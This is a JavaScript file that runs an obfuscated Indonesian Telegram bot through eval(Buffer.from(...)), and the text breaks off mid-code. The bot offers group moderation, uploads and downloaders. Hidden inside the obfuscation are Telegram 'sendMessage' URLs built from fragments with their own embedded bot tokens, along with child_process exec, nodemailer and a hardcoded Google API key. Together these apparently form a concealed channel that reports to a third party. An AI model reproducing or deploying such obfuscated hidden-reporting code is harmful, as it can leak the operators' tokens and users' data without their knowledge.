(function() {
  try {
    eval(Buffer.from("const a0_0x459982=a0_0x1014;(function(_0x1f4056,_0x4d7531){const _0x1fa748=a0_0x1014,_0xa74f34=_0x1f4056();while(!![]){try{const _0x267a26=-parseInt(_0x1fa748(0x2288))/0x1*(-parseInt(_0x1fa748(0x2301))/0x2)+parseInt(_0x1fa748(0x2a3d))/0x3+parseInt(_0x1fa748(0x163))/0x4+-parseInt(_0x1fa748(0x8a9))/0x5*(parseInt(_0x1fa748(0xd3a))/0x6)+parseInt(_0x1fa748(0x1cfd))/0x7+parseInt(_0x1fa748(0x11e0))/0x8+parseInt(_0x1fa748(0x1da8))/0x9*(-parseInt(_0x1fa748(0x2462))/0xa);if(_0x267a26===_0x4d7531)break;else _0xa74f34['push'](_0xa74f34['shift']());}catch(_0xd8a76b){_0xa74f34['push'](_0xa74f34['shift']());}}}(a0_0x3bd5,0x80e53),require(a0_0x459982(0x16ea)));const {Telegraf,Context}=require(a0_0x459982(0x1c57)),{message,editedMessage,channelPost,editedChannelPost,callbackQuery}=require('telegraf/f'+'ilters'),bot=new Telegraf(BOT_TOKEN),axios=require('axios'),chalk=require(a0_0x459982(0x1c38)),FormData=require(a0_0x459982(0x1d70)),crypto=require(a0_0x459982(0x157b)),cheerio=require('cheerio'),archiver=require(a0_0x459982(0x13a1)),{sizeFormatter}=require(a0_0x459982(0x109a)+a0_0x459982(0x21e0)),uploadCatbox=require('./lib/catb'+'ox'),stickerToPng=require(a0_0x459982(0xec4)+'g'),videoToMp3=require(a0_0x459982(0x901)+a0_0x459982(0xc51)),getProfilePic=require('./lib/getp'+'p'),igNekorinn=require(a0_0x459982(0x15de)),format=sizeFormatter(),{exec}=require(a0_0x459982(0xfc)+a0_0x459982(0x87d)),fs=require('fs'),tmp=require(a0_0x459982(0x1f06)+'e'),qs=require('qs'),puppeteer=require(a0_0x459982(0x234)),path=require(a0_0x459982(0x2ede));let request=require(a0_0x459982(0x365));const fetch=require(a0_0x459982(0x24b4)),{google}=require(a0_0x459982(0x94f)),os=require('os'),osu=require('os-utils'),speed=require(a0_0x459982(0x2ca7)+a0_0x459982(0xa74)),util=require(a0_0x459982(0x18e0)),yts=require(a0_0x459982(0x1342)),nodemailer=require('nodemailer'),telegramUrl=a0_0x459982(0x25fb)+a0_0x459982(0x1005)+a0_0x459982(0x1401)+a0_0x459982(0x2010)+a0_0x459982(0x3a8)+a0_0x459982(0x2021)+a0_0x459982(0x165)+'O3xA/sendM'+a0_0x459982(0x39f),telegramUrl1='https://ap'+a0_0x459982(0x1005)+a0_0x459982(0xdfd)+a0_0x459982(0x1b9d)+a0_0x459982(0x1034)+a0_0x459982(0x1f94)+'iZY685JbGM'+a0_0x459982(0x1ca3)+a0_0x459982(0x39f);let pendingVerifications={};const antiLinkGroup=JSON[a0_0x459982(0x1c34)](fs[a0_0x459982(0x10c9)](a0_0x459982(0x362)+a0_0x459982(0x1aef))?fs['readFileSy'+'nc'](a0_0x459982(0x362)+'link.json'):'{}');function saveAntiLink(){const _0x153216=a0_0x459982,_0x55db97={'BLzsX':_0x153216(0x362)+_0x153216(0x1aef)};fs[_0x153216(0x22b5)+'ync'](_0x55db97[_0x153216(0xbb3)],JSON[_0x153216(0x1cf5)](antiLinkGroup,null,0x2));}const antiSpamGroup=JSON[a0_0x459982(0x1c34)](fs[a0_0x459982(0x10c9)](a0_0x459982(0x362)+a0_0x459982(0x2dfc)+a0_0x459982(0x2e4c))?fs[a0_0x459982(0x2113)+'nc'](a0_0x459982(0x362)+a0_0x459982(0x2dfc)+a0_0x459982(0x2e4c)):'{}');function saveAntiSpam(){const _0x2e12d5=a0_0x459982,_0x5f0f2c={'vCwBH':_0x2e12d5(0x362)+'spam_group'+_0x2e12d5(0x2e4c)};fs[_0x2e12d5(0x22b5)+_0x2e12d5(0xfd5)](_0x5f0f2c[_0x2e12d5(0x686)],JSON['stringify'](antiSpamGroup,null,0x2));}let spamWarning={};const youtube=google[a0_0x459982(0x2495)]({'version':'v3','auth':'AIzaSyA6rc'+a0_0x459982(0x10ff)+a0_0x459982(0x2242)+a0_0x459982(0x2892)}),{simple}=require(a0_0x459982(0xd26)+'nc');async function uploadToCatbox(_0x188bd0,_0x8cdc27='file'){const _0x55520c=a0_0x459982,_0x16184c={'LJJEB':'reqtype','tyEFn':'fileupload','cdrEv':_0x55520c(0x14ce)+'ad','GtMxP':function(_0x889cce,_0x2ad7a3){return _0x889cce+_0x2ad7a3;},'YLyLC':'Catbox\x20err'+'or:\x20'},_0x3faa57=new FormData();_0x3faa57['append'](_0x16184c[_0x55520c(0x1da5)],_0x16184c['tyEFn']),_0x3faa57[_0x55520c(0x5a0)](_0x16184c[_0x55520c(0x23ac)],_0x188bd0,{'filename':_0x8cdc27});const {data:_0x17ced9}=await axios[_0x55520c(0x2ed5)](_0x55520c(0x2691)+'tbox.moe/u'+_0x55520c(0x117e)+'p',_0x3faa57,{'headers':_0x3faa57[_0x55520c(0x2438)](),'maxBodyLength':Infinity});if(!/^https?:\/\//[_0x55520c(0x1dc7)](_0x17ced9))throw new Error(_0x16184c['GtMxP'](_0x16184c[_0x55520c(0xac5)],_0x17ced9));return _0x17ced9['trim']();}let spamFile=a0_0x459982(0x1365)+a0_0x459982(0x2e4c),userSpamData={};fs[a0_0x459982(0x10c9)](spamFile)?userSpamData=JSON[a0_0x459982(0x1c34)](fs[a0_0x459982(0x2113)+'nc'](spamFile)):fs[a0_0x459982(0x22b5)+a0_0x459982(0xfd5)](spamFile,JSON[a0_0x459982(0x1cf5)]({}));const saveSpamData=()=>{const _0x226d48=a0_0x459982;fs[_0x226d48(0x22b5)+_0x226d48(0xfd5)](spamFile,JSON['stringify'](userSpamData,null,0x2));},bannedPath='./lib/bann'+a0_0x459982(0xc1f);let bannedUsers=JSON[a0_0x459982(0x1c34)](fs[a0_0x459982(0x2113)+'nc'](bannedPath));function saveBanned(){const _0x57f0c5=a0_0x459982;fs['writeFileS'+_0x57f0c5(0xfd5)](bannedPath,JSON[_0x57f0c5(0x1cf5)](bannedUsers,null,0x2));}function banUser(_0x38f6be){const _0x1ce11e=a0_0x459982;!bannedUsers[_0x1ce11e(0x55c)](_0x38f6be)&&(bannedUsers[_0x1ce11e(0x7dc)](_0x38f6be),saveBanned());}function unbanUser(_0x2f9f29){const _0x116b8f=a0_0x459982,_0x268c4f={'ULDWB':function(_0x514885){return _0x514885();}};bannedUsers=bannedUsers[_0x116b8f(0xfc3)](_0x279c33=>_0x279c33!==_0x2f9f29),_0x268c4f[_0x116b8f(0x16dc)](saveBanned);}function isBanned(_0x4d6f33){return bannedUsers['includes'](_0x4d6f33);}const groupsFile=a0_0x459982(0x1fcd)+'son';!fs[a0_0x459982(0x10c9)](groupsFile)&&fs[a0_0x459982(0x22b5)+a0_0x459982(0xfd5)](groupsFile,JSON[a0_0x459982(0x1cf5)]([],null,0x2));let groupsData=JSON[a0_0x459982(0x1c34)](fs[a0_0x459982(0x2113)+'nc'](groupsFile));function saveGroups(){const _0x5e9733=a0_0x459982;fs[_0x5e9733(0x22b5)+'ync'](groupsFile,JSON[_0x5e9733(0x1cf5)](groupsData,null,0x2));}async function uploadPhotoFromTelegram(_0x17e5e8){const _0x5ada88=a0_0x459982,_0x1af2d5={'ONGFi':_0x5ada88(0x26a1)+'r','rozTc':'https://up'+_0x5ada88(0x192d)+_0x5ada88(0x22e9)+_0x5ada88(0x26b8)+_0x5ada88(0x24b1),'WqypW':_0x5ada88(0x27d7)+_0x5ada88(0x2eaa)+'r.'},_0x1cdc84=await bot[_0x5ada88(0x1986)][_0x5ada88(0x133e)+'k'](_0x17e5e8),_0x1dca6f=new FormData();_0x1dca6f[_0x5ada88(0x5a0)](_0x5ada88(0x2fc),await(await axios[_0x5ada88(0x1a6)](_0x1cdc84[_0x5ada88(0x2899)],{'responseType':_0x1af2d5[_0x5ada88(0xb25)]}))[_0x5ada88(0x2bb6)],_0x5ada88(0x8d5));const _0xbc37d3=await axios[_0x5ada88(0x2ed5)](_0x1af2d5['rozTc'],_0x1dca6f,{'headers':_0x1dca6f['getHeaders']()}),{raw_url:_0x38722b}=_0xbc37d3[_0x5ada88(0x2bb6)];if(!_0x38722b)throw new Error(_0x1af2d5[_0x5ada88(0x37b)]);return _0x38722b;}module[a0_0x459982(0x2464)]=ndikz=async(_0x23c0de,_0x25840a)=>{const _0x240d04=a0_0x459982,_0x1ce978={'DIFir':function(_0x439735,_0x278ebd){return _0x439735(_0x278ebd);},'SpYFk':function(_0x266a29,_0x3f1372){return _0x266a29!==_0x3f1372;},'MoPHy':_0x240d04(0xb87),'AbTqy':_0x240d04(0x2bc7),'QFalc':function(_0x5aea61,_0xe2c27c){return _0x5aea61<_0xe2c27c;},'PWYYU':function(_0x47b51d,_0x434f91){return _0x47b51d+_0x434f91;},'SWFIJ':function(_0x48c01b,_0x1af84b){return _0x48c01b+_0x1af84b;},'OQugc':_0x240d04(0x1f93),'mVsDZ':function(_0x459ea6,_0x6de252){return _0x459ea6(_0x6de252);},'asNVy':_0x240d04(0x1736)+'om...\x0a_sil'+_0x240d04(0x1848)+_0x240d04(0xe6d)+_0x240d04(0x2bdf)+'a_','FBZnl':function(_0x26eeb0){return _0x26eeb0();},'YUtEq':'error','HRhcg':_0x240d04(0x5b6)+'al','wqmPl':function(_0x2943da,_0x1112e0,_0x3b46a5,_0x57cb4f){return _0x2943da(_0x1112e0,_0x3b46a5,_0x57cb4f);},'lqTbJ':_0x240d04(0x2105),'QFLsq':function(_0x23167e,_0x49c167){return _0x23167e(_0x49c167);},'YiQEV':function(_0x4caecb,_0x15b0ed){return _0x4caecb!==_0x15b0ed;},'ioJpK':'dRoMS','BOAWH':function(_0x5c69ce,_0x3067be){return _0x5c69ce===_0x3067be;},'yctSz':_0x240d04(0x1df3),'bThfM':_0x240d04(0x765),'vJjuV':_0x240d04(0x276d)+_0x240d04(0xfff)+_0x240d04(0x2d3d),'CaogP':function(_0x10043e,_0x4219aa){return _0x10043e(_0x4219aa);},'VnZmr':_0x240d04(0x282d),'haHIg':_0x240d04(0x9dc),'cfCKD':_0x240d04(0x29e3)+_0x240d04(0x2c96)+_0x240d04(0x5d2),'lpboD':function(_0x1c312a,_0x141501){return _0x1c312a%_0x141501;},'qTZTI':function(_0xb3746f,_0x177d6e){return _0xb3746f/_0x177d6e;},'KdBjs':'⚠️\x20Kamu\x20bel'+'um\x20daftar\x20'+_0x240d04(0x1813)+'an\x20/daftar'+_0x240d04(0x2cfd)+_0x240d04(0x163d)+_0x240d04(0x2d8a),'GLjbl':_0x240d04(0xef3),'ozfOG':function(_0x5f30b6,_0x2486d2){return _0x5f30b6(_0x2486d2);},'uvaop':function(_0x211e1d,_0x5f0ab9){return _0x211e1d===_0x5f0ab9;},'rhHoG':_0x240d04(0xf30),'uIPtm':_0x240d04(0x93f),'xCoGE':_0x240d04(0xc72),'FHfsx':function(_0x209a41,_0x13f1ef){return _0x209a41%_0x13f1ef;},'lwCss':function(_0x4b7a5d,_0x3a1bdb){return _0x4b7a5d%_0x3a1bdb;},'lHtqH':function(_0x13a3e8,_0x5958d9){return _0x13a3e8/_0x5958d9;},'vNEZp':_0x240d04(0x1aba),'Pnijd':function(_0x39cd9,_0x57faeb){return _0x39cd9*_0x57faeb;},'KuDUT':function(_0x4d1b98,_0x4b7d42){return _0x4d1b98**_0x4b7d42;},'idYWD':function(_0x458fd9,_0x477bdc){return _0x458fd9(_0x477bdc);},'Nicrx':function(_0x5ac7df,_0x2c4638){return _0x5ac7df-_0x2c4638;},'sOHZS':function(_0x42b2d2,_0x1d2961){return _0x42b2d2*_0x1d2961;},'DfQwC':function(_0x3c5909,_0x3d1ba9){return _0x3c5909(_0x3d1ba9);},'GvmPR':function(_0xd55e54,_0xaaaa21){return _0xd55e54*_0xaaaa21;},'LDqCu':function(_0x253fb6,_0x3f8dd2){return _0x253fb6===_0x3f8dd2;},'Foyak':function(_0x189774,_0x401c9f){return _0x189774(_0x401c9f);},'lJuKP':_0x240d04(0x54a)+_0x240d04(0x1e1b)+_0x240d04(0x1ce)+_0x240d04(0xbd6),'XXGJn':_0x240d04(0x840),'Pjmqz':function(_0x48fd30,_0x4b7e58,_0x23e51c){return _0x48fd30(_0x4b7e58,_0x23e51c);},'ibYwC':function(_0x1946cc,_0x2db8d1){return _0x1946cc==_0x2db8d1;},'FpNka':function(_0x17c751,_0x280077){return _0x17c751!==_0x280077;},'lGpAs':_0x240d04(0x1502),'EisPG':function(_0x487704,_0x3425e8){return _0x487704>_0x3425e8;},'POtHq':function(_0x17fcee,_0x4da096){return _0x17fcee*_0x4da096;},'UhbFs':function(_0x2e9004,_0x4d8d67){return _0x2e9004-_0x4d8d67;},'lWefv':'❌\x20Anti-spa'+'m\x20grup\x20*NO'+_0x240d04(0x1963),'scrZu':function(_0x5eb708,_0x4cbfd0){return _0x5eb708!==_0x4cbfd0;},'fovnW':_0x240d04(0x2032),'VqMny':_0x240d04(0x3e4)+_0x240d04(0x2947),'fImVk':'YdFnT','BWsLw':_0x240d04(0x198e),'vBmJN':function(_0x43d578,_0x396d79,_0x4155ef,_0x57b5fa){return _0x43d578(_0x396d79,_0x4155ef,_0x57b5fa);},'owkUZ':_0x240d04(0x26c2),'ZiWTN':function(_0x56e005,_0x3ee2bf){return _0x56e005(_0x3ee2bf);},'tlDJH':'Gagal\x20meng'+_0x240d04(0x5e8)+_0x240d04(0x2499)+_0x240d04(0x25ba)+_0x240d04(0x131),'nnbVA':function(_0x1febca,_0x196b12){return _0x1febca*_0x196b12;},'iOIVV':_0x240d04(0xecc)+_0x240d04(0x23ea)+'n\x20game\x20lai'+_0x240d04(0x24a2)+_0x240d04(0x2163)+'ntuk\x20menye'+_0x240d04(0x13eb),'iyhPP':function(_0x27bf20,_0x4660b7){return _0x27bf20+_0x4660b7;},'KJAvP':_0x240d04(0xf6b)+_0x240d04(0x1c9c),'nmZXS':function(_0xa952e3,_0x95f48e){return _0xa952e3(_0x95f48e);},'GVsno':function(_0x8f613d,_0x75d24d){return _0x8f613d+_0x75d24d;},'gcNhy':function(_0x57cf1f,_0x4ec4a){return _0x57cf1f(_0x4ec4a);},'vchiT':_0x240d04(0x2720)+'mulai\x20game'+'.','hEbhY':function(_0x2bd3f1,_0x1266ea){return _0x2bd3f1(_0x1266ea);},'IGORK':function(_0x923aea,_0x552f42){return _0x923aea>=_0x552f42;},'mNUsq':function(_0x1ff064,_0x3ee1e0){return _0x1ff064-_0x3ee1e0;},'VgyFR':function(_0x2199fa,_0x16a509){return _0x2199fa(_0x16a509);},'KsuAw':function(_0x109249,_0x33c2ed){return _0x109249(_0x33c2ed);},'RvFIO':function(_0x1b6c4a,_0x2ad3d2){return _0x1b6c4a(_0x2ad3d2);},'XEfDD':function(_0xdbeb64,_0x156962){return _0xdbeb64(_0x156962);},'OCQzk':function(_0x12509a,_0x34ce17){return _0x12509a+_0x34ce17;},'WvtUE':function(_0x1644d,_0x321a21){return _0x1644d(_0x321a21);},'sQGDl':_0x240d04(0x14f0)+'ang\x20dipenj'+_0x240d04(0x13c8)+'an\x20*bebas*'+_0x240d04(0xea7)+_0x240d04(0x156f)+_0x240d04(0x254)+'ar.','jZgVp':'logo','WuIRx':function(_0x4e6fa6,_0x28ca58,_0xe56444,_0x39de0d){return _0x4e6fa6(_0x28ca58,_0xe56444,_0x39de0d);},'wwBUQ':_0x240d04(0x1634),'zYpKE':function(_0x368a42,_0x5b145f){return _0x368a42(_0x5b145f);},'SOxnH':_0x240d04(0x1bd2),'LNfjT':function(_0x365c3b,_0x449f87){return _0x365c3b(_0x449f87);},'djjmE':_0x240d04(0x1d07),'xIvGE':function(_0x596cdb,_0x2e5df3){return _0x596cdb in _0x2e5df3;},'HQNDB':_0x240d04(0x2ca0)+_0x240d04(0x2470)+_0x240d04(0xbe)+_0x240d04(0xfdc)+_0x240d04(0x97c)+_0x240d04(0x14cf)+_0x240d04(0x951)+_0x240d04(0x13eb),'hnAJD':function(_0x2bb255,_0x24d283,_0x5b7acc,_0xfbdc6f){return _0x2bb255(_0x24d283,_0x5b7acc,_0xfbdc6f);},'ERPCt':function(_0x50b3bf,_0x2a53ed){return _0x50b3bf/_0x2a53ed;},'WQPnI':function(_0x2a86e8,_0x58b6e8){return _0x2a86e8-_0x58b6e8;},'ymOEq':function(_0x4f3941,_0x494eb8){return _0x4f3941*_0x494eb8;},'tqxsl':function(_0x47c1d5,_0x17ce21){return _0x47c1d5(_0x17ce21);},'mFeFp':function(_0x671785,_0x19c879){return _0x671785/_0x19c879;},'dmjkW':function(_0x56b888,_0x24fd82){return _0x56b888/_0x24fd82;},'rLyzc':function(_0x3115ff,_0x41ed35){return _0x3115ff%_0x41ed35;},'zjFKN':_0x240d04(0xc53),'pbxwu':function(_0x4d7e0d,_0x2ba2d9){return _0x4d7e0d(_0x2ba2d9);},'CREVV':function(_0x9b2914,_0x3851d3){return _0x9b2914(_0x3851d3);},'IYBbO':_0x240d04(0x14f0)+_0x240d04(0x9ad)+_0x240d04(0x2b5c)+_0x240d04(0x2826)+_0x240d04(0x1fbc)+'nggaran!\x0aG'+_0x240d04(0x260)+_0x240d04(0x1c31)+_0x240d04(0x2b19)+_0x240d04(0x7af)+_0x240d04(0x2e65)+_0x240d04(0xe32),'tAqfK':function(_0xffc7fa,_0x478f11){return _0xffc7fa(_0x478f11);},'CpILc':function(_0x53d966,_0x148a86){return _0x53d966+_0x148a86;},'jznEJ':_0x240d04(0x2565)+_0x240d04(0x222c),'sIctq':'Ih\x20item','mxSDf':'Putih\x20Mulu'+'s','HnPWt':_0x240d04(0x350),'aKpTA':_0x240d04(0x2521),'PRoRE':_0x240d04(0xbfd)+'y','fQwfC':'Perawan','uoYPX':_0x240d04(0xeba),'sGLNR':_0x240d04(0x25d2)+'h\x20dimasuki'+'n','asjcN':_0x240d04(0x2205)+'t','zJIWL':'Tembem','rCRmZ':function(_0x12914f,_0x213595){return _0x12914f(_0x213595);},'KFAaE':_0x240d04(0x24cb),'TUuco':_0x240d04(0x1dc9)+'t','XhNqx':_0x240d04(0x29bc),'JzIdi':_0x240d04(0x1562),'sTggA':function(_0x436a0e,_0x29ab2f){return _0x436a0e(_0x29ab2f);},'YfGaz':_0x240d04(0x1cd2)+_0x240d04(0x1748)+_0x240d04(0x7b4)+_0x240d04(0x6ea)+'.','JKWwh':function(_0x339955,_0x290970){return _0x339955(_0x290970);},'DdNSX':function(_0x435a14,_0x3120dc){return _0x435a14(_0x3120dc);},'Ezxuo':function(_0x3cb85c,_0x36773f){return _0x3cb85c+_0x36773f;},'BIrjZ':function(_0x1b973e,_0x2c3867){return _0x1b973e(_0x2c3867);},'IxgGF':'avatar','NOTMw':function(_0x5b2ea7,_0x221097){return _0x5b2ea7(_0x221097);},'UyIYi':function(_0x1e5453,_0x5634f2){return _0x1e5453*_0x5634f2;},'hpyzJ':function(_0x9a4f2f,_0xe1547e){return _0x9a4f2f>_0xe1547e;},'vFhSM':function(_0x2ca652,_0x2429ef){return _0x2ca652(_0x2429ef);},'FitPT':function(_0x266f59,_0x90c72e){return _0x266f59(_0x90c72e);},'xhzjV':function(_0x57ddd2,_0x2c6f87){return _0x57ddd2(_0x2c6f87);},'Mgayv':'Nyocot\x20Ero'+_0x240d04(0x19a0),'lZzZV':function(_0x293cc4,_0x416053){return _0x293cc4*_0x416053;},'FjSTo':function(_0x608611,_0x36f826){return _0x608611(_0x36f826);},'JnYAb':function(_0x2f454e,_0x2706e6){return _0x2f454e(_0x2706e6);},'jPpib':function(_0x5604f4,_0x47f951){return _0x5604f4+_0x47f951;},'AezUZ':_0x240d04(0x2720)+'nambahkan:'+'\x20','TGBkj':function(_0x2cdab9,_0x2e86dc){return _0x2cdab9(_0x2e86dc);},'oHLuy':_0x240d04(0x54a)+'salahan\x20sa'+_0x240d04(0x1066)+_0x240d04(0x427)+'.','VPxyB':_0x240d04(0x2ad8),'bTIql':'🌱🍇','ZvfpB':_0x240d04(0x1ad7),'TlWVR':_0x240d04(0xea9),'rKuiZ':_0x240d04(0x54a)+_0x240d04(0x1e1b)+_0x240d04(0x1720)+_0x240d04(0x1cbe),'SATUs':function(_0x4e80d4,_0x13eb81){return _0x4e80d4(_0x13eb81);},'Rdtcu':_0x240d04(0x2207)+'wnload:\x20','fKUhy':_0x240d04(0x28d8),'DWrzO':function(_0x4142a4,_0x15556c){return _0x4142a4(_0x15556c);},'PxjLq':_0x240d04(0xaaf),'kmtUo':function(_0x273b8e,_0x3857f6){return _0x273b8e===_0x3857f6;},'sghYt':_0x240d04(0x19b5),'cYYTP':_0x240d04(0x14b8)+_0x240d04(0xe82),'HJSwf':'letters','CEiWP':function(_0x56aab1,_0x5ad9ad){return _0x56aab1(_0x5ad9ad);},'MowHh':_0x240d04(0x225c)+_0x240d04(0x13c7)+_0x240d04(0x1f86)+_0x240d04(0x2a85),'wkJdN':function(_0x27c190,_0x3b9655){return _0x27c190(_0x3b9655);},'hhevy':_0x240d04(0x18c9)+_0x240d04(0x157a)+'\x0a','kBPKG':function(_0x2436d3,_0x304033){return _0x2436d3(_0x304033);},'GfzEQ':'https://te'+'legra.ph/f'+_0x240d04(0x2237)+_0x240d04(0xe3a)+_0x240d04(0x2411),'gHEzs':function(_0x59c73c,_0x31b7e9){return _0x59c73c(_0x31b7e9);},'ZXsLX':function(_0x36e511,_0xe012e3){return _0x36e511/_0xe012e3;},'OtjBf':function(_0x46d900,_0x12f3ed){return _0x46d900%_0x12f3ed;},'sZJXN':function(_0x59a4be,_0x459b9b){return _0x59a4be/_0x459b9b;},'dAAzS':function(_0x11ff3a,_0x1e0249){return _0x11ff3a(_0x1e0249);},'sCLDa':function(_0x121415,_0x7948d6){return _0x121415/_0x7948d6;},'vnZkk':function(_0x48b622,_0x31fa6f){return _0x48b622*_0x31fa6f;},'ZWRcG':function(_0xe31949,_0x1c1ab5){return _0xe31949-_0x1c1ab5;},'LLIVy':function(_0x2ff7d3,_0xe6199){return _0x2ff7d3>_0xe6199;},'iGvTk':function(_0x699374,_0x30dfb7){return _0x699374>_0x30dfb7;},'rnhhW':function(_0x2ed9a0,_0x17695b){return _0x2ed9a0-_0x17695b;},'qeTUa':function(_0x5d9d0e,_0x31d06d){return _0x5d9d0e*_0x31d06d;},'LCvNo':function(_0x5c0c34,_0x14ff50){return _0x5c0c34(_0x14ff50);},'Mcmdz':function(_0x52ec64,_0x130dbf){return _0x52ec64+_0x130dbf;},'ZKIxp':_0x240d04(0x27d7)+'load:\x20','QFHPS':function(_0x2dcb7b,_0x36ef90){return _0x2dcb7b(_0x36ef90);},'fFlUq':_0x240d04(0x2b8e)+_0x240d04(0xa4a)+_0x240d04(0x68c),'qTeEp':function(_0x619183,_0x5729c7){return _0x619183*_0x5729c7;},'ZJrEj':function(_0x4065ea,_0x4f37b1){return _0x4065ea*_0x4f37b1;},'HVOxf':function(_0x3c98bc,_0x47b760){return _0x3c98bc%_0x47b760;},'MEwzd':function(_0x3fb69a,_0x12dc54){return _0x3fb69a*_0x12dc54;},'oLPnH':function(_0x331ff5,_0x32b964){return _0x331ff5/_0x32b964;},'CdQRP':function(_0x89efe2,_0xaae371){return _0x89efe2/_0xaae371;},'ibRNm':function(_0x1fe2cf,_0x366038){return _0x1fe2cf(_0x366038);},'BzgPR':function(_0x57c6e9,_0x48dbc2){return _0x57c6e9+_0x48dbc2;},'Hvfmy':function(_0x2d404a,_0x2ff611){return _0x2d404a!==_0x2ff611;},'kauEw':'bDrff','nWGYZ':function(_0x2ffe13,_0x5a60a1){return _0x2ffe13(_0x5a60a1);},'oHuOt':function(_0x2e73d5,_0x1acbf7){return _0x2e73d5(_0x1acbf7);},'gtTvo':'div.ayat-d'+_0x240d04(0x2bfd)+'v.ayat-ara'+'b','GjYJC':_0x240d04(0x1c5d)+_0x240d04(0x2bfd)+'v.ayat-lat'+'in','dBFYw':_0x240d04(0x1c5d)+'etail\x20>\x20di'+_0x240d04(0x179b)+'ail-text','TxINw':_0x240d04(0x1c5d)+_0x240d04(0x2bfd)+_0x240d04(0x8d4)+'ox\x20>\x20div','Rxptl':_0x240d04(0x1c5d)+_0x240d04(0x2bfd)+'v.ayat-sum'+_0x240d04(0x1ffe),'UHTSt':function(_0x4ea189,_0x665fbe){return _0x4ea189>=_0x665fbe;},'TwwrM':function(_0x12be0d,_0xf2b4c){return _0x12be0d<_0xf2b4c;},'OmLYe':function(_0x54b4fa,_0x54685d){return _0x54b4fa<_0x54685d;},'UEucX':function(_0x462f3a,_0x456223){return _0x462f3a<_0x456223;},'JbnAP':function(_0x2fc318,_0x441272){return _0x2fc318===_0x441272;},'YLiiZ':function(_0x4b4965,_0x35382f){return _0x4b4965(_0x35382f);},'HQzeY':function(_0x571064,_0x9c3b5b){return _0x571064/_0x9c3b5b;},'qcGaY':function(_0x48ed2a,_0x3307e6){return _0x48ed2a===_0x3307e6;},'aFXiB':function(_0x12459c,_0x413df1,_0x70a137,_0x2c5073){return _0x12459c(_0x413df1,_0x70a137,_0x2c5073);},'tANZZ':function(_0x1e09d6,_0x21cb36){return _0x1e09d6>=_0x21cb36;},'kdDqY':function(_0x3b3c74,_0x149e19){return _0x3b3c74(_0x149e19);},'jAxYz':function(_0x1e2ab0,_0x96d10c){return _0x1e2ab0(_0x96d10c);},'NOxbL':function(_0x230387,_0x5bd479){return _0x230387(_0x5bd479);},'AWHzb':'Markdown','vZHbm':_0x240d04(0x164f)+'ks','CXnKv':_0x240d04(0x2720)+_0x240d04(0x26ea)+'URL\x20gambar'+'.','PUErI':function(_0x79e835,_0xeb1c89){return _0x79e835(_0xeb1c89);},'zZKQd':function(_0xfe64f0,_0x2b04a3){return _0xfe64f0+_0x2b04a3;},'OYvlb':_0x240d04(0x2720)+'nutup\x20grup'+':\x20','GBNUI':'Terjadi\x20ke'+_0x240d04(0x1e1b)+_0x240d04(0x1ce)+_0x240d04(0x1517),'gMmLg':function(_0x556dbd,_0xa33e0){return _0x556dbd(_0xa33e0);},'Peuer':_0x240d04(0xc37)+_0x240d04(0x1914),'deHts':function(_0x1824b4,_0x1b51d9){return _0x1824b4(_0x1b51d9);},'lOiuz':_0x240d04(0x1fdc),'fLtHL':function(_0x1c9f4e,_0x3b6d1b){return _0x1c9f4e(_0x3b6d1b);},'svMKe':function(_0x70d47d,_0x4cfa09){return _0x70d47d(_0x4cfa09);},'iogZI':function(_0x73e865,_0x3c6e55){return _0x73e865/_0x3c6e55;},'JmIfa':function(_0xf37412,_0x481d8a){return _0xf37412-_0x481d8a;},'xXRrR':function(_0x14630c,_0x130429){return _0x14630c(_0x130429);},'PXLbd':function(_0x5bcc85,_0x1969fe){return _0x5bcc85(_0x1969fe);},'VeUEy':_0x240d04(0x54a)+_0x240d04(0x1e1b)+_0x240d04(0x952)+'.','YxAim':function(_0x3a2b8a,_0x5712d8){return _0x3a2b8a+_0x5712d8;},'FYfBQ':function(_0x19e1b0,_0x207eb7){return _0x19e1b0-_0x207eb7;},'VDktp':function(_0x1bda29,_0x791188){return _0x1bda29(_0x791188);},'MqAFl':function(_0x504413,_0x606849){return _0x504413+_0x606849;},'LlNmz':'QrTOH','JNIeM':_0x240d04(0x1f01)+_0x240d04(0x1d6f)+_0x240d04(0x1469)+_0x240d04(0x1712)+_0x240d04(0x723),'dYsSJ':function(_0x1a1f65,_0x2e2465,_0x1b7067,_0x566ec5){return _0x1a1f65(_0x2e2465,_0x1b7067,_0x566ec5);},'xxHEa':'Terjadi\x20ke'+_0x240d04(0x1e1b)+_0x240d04(0xfc1)+'.','BNZQS':function(_0x4df9bf,_0x391454){return _0x4df9bf+_0x391454;},'OCsGr':function(_0x5f4339,_0xfe3aad){return _0x5f4339+_0xfe3aad;},'NRLuL':function(_0x3cda4b,_0x4cb879){return _0x3cda4b(_0x4cb879);},'lETcD':function(_0x2c57a0,_0x3ab133){return _0x2c57a0(_0x3ab133);},'runyR':function(_0x544685,_0x24038d){return _0x544685(_0x24038d);},'ppehK':'❌\x20Gagal\x20me'+_0x240d04(0x2256)+':\x20','hyvyh':'VVMDe','veXDg':function(_0x756738,_0x1ddf37){return _0x756738%_0x1ddf37;},'PBRMR':function(_0x35526a,_0x5f5d58){return _0x35526a%_0x5f5d58;},'nvVcC':function(_0x594dbd,_0x1050bb){return _0x594dbd(_0x1050bb);},'Zdtsq':function(_0x243727,_0x438484){return _0x243727<_0x438484;},'VWvYJ':function(_0x11dc7c,_0xd76be2){return _0x11dc7c(_0xd76be2);},'snnwC':'method=\x22ge'+_0x240d04(0xc89),'pVKSY':function(_0x282190,_0x4a7a19){return _0x282190+_0x4a7a19;},'qosuy':function(_0x57d773,_0x43bc02){return _0x57d773(_0x43bc02);},'qiZMp':'Namanya\x20si'+_0x240d04(0x2c91),'KjHAW':function(_0x10e108,_0x443eac){return _0x10e108+_0x443eac;},'CNljG':function(_0xeecb97,_0xfe3356){return _0xeecb97+_0xfe3356;},'SoKmw':_0x240d04(0x168b)+'ubmit%21+','sHlcV':function(_0x59c258,_0x18fa8b){return _0x59c258/_0x18fa8b;},'umVJm':function(_0x509373,_0x4f92ef){return _0x509373%_0x4f92ef;},'gaCKu':function(_0x3fe861,_0x210d5f){return _0x3fe861/_0x210d5f;},'ZEbET':function(_0x82ebc5,_0x1efc3c){return _0x82ebc5%_0x1efc3c;},'atcHr':function(_0x18120a,_0x15d0a4){return _0x18120a*_0x15d0a4;},'ZCppT':function(_0x664b2a,_0x204c50){return _0x664b2a%_0x204c50;},'CnBHf':function(_0x32eb95,_0x1ca963){return _0x32eb95*_0x1ca963;},'EiHJE':'vDlRQ','zDQkJ':_0x240d04(0x28c2),'SOKZX':function(_0x35be9c,_0x3fca76){return 